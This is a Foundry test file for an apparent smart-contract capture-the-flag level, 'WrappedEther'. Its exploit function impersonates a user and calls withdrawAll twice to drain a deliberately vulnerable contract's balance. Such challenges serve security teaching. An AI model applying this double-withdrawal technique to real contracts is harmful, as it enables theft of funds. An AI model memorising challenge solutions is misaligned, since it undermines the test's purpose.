// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;
    address user = address(0x123);

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
        instance.transfer(user, 0.09 ether);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */

        vm.prank(user);
        instance.withdrawAll();

        vm.prank(user);
        instance.withdrawAll();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}